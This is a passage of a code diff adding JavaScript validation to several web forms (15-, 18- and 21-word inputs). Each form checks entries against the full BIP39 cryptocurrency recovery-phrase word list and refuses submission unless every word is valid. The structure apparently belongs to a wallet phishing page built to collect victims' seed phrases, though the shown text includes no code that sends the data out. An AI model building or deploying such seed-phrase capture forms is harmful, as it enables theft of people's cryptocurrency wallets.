"gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo","testing"]; // Array of phrase_value
+    var inputs = document.querySelectorAll('.input15'); // Access all input elements by class name
+    var isValid = true;
+
+    for (var i = 0; i < inputs.length; i++) {
+      var inputValue = inputs[i].value;
+      if (inputValue === '') {
+        alert('Please enter a value for Input ' + (i + 1));
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input field is empty
+        break;
+      } else if (!phrase_value.includes(inputValue)) {
+        alert('Input ' + (i + 1) + ' value does not match the Phrase.');
+        isValid = false;
+        event.preventDefault(); // Prevent form submission if any input value doesn't match
+        break;
+      }
+    }
+
+    return isValid; // Allow or prevent form submission based on validation
+  });
+</script>
+            <!-- match input15 data end  -->
+
+
+            <!-- =========== match input18 data start -->
+                      <script>
+  document.getElementById('passwordForm18').addEventListener('submit', function (event) {
+    var phrase_value = 
+    ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo","testing"]; // Array of phrase_value
+    var inputs = document.querySelectorAll('.input18'); // Access all input elements by class name
+    var currentInputIndex = 0;
+    var isValid = true;
+
+    function validateInput() {
+      var inputValue = inputs[currentInputIndex].value;
+
+      if (inputValue === '') {
+        alert('Please enter a value for Input ' + (currentInputIndex + 1));
+        inputs[currentInputIndex].style.border = '1px solid red';
+        isValid = false;
+      } else if (!phrase_value.includes(inputValue)) {
+        alert('Input ' + (currentInputIndex + 1) + ' value does not match the Phrase.');
+        inputs[currentInputIndex].style.border = '1px solid red';
+        isValid = false;
+      } else {
+        inputs[currentInputIndex].style.border = ''; // Remove red border if validation passes
+      }
+    }
+
+    while (currentInputIndex < inputs.length) {
+      validateInput();
+      if (!isValid) {
+        event.preventDefault(); // Prevent form submission if validation fails
+        break;
+      }
+      currentInputIndex++;
+    }
+
+    return isValid; // Allow or prevent form submission based on validation
+  });
+</script>
+
+
+            <!-- match input18 data end  -->
+
+
+               <!-- =========== match passwordForm21 data start -->
+            <script>
+  document.getElementById('passwordForm21').addEventListener('submit', function (event) {
+    var phrase_value = 
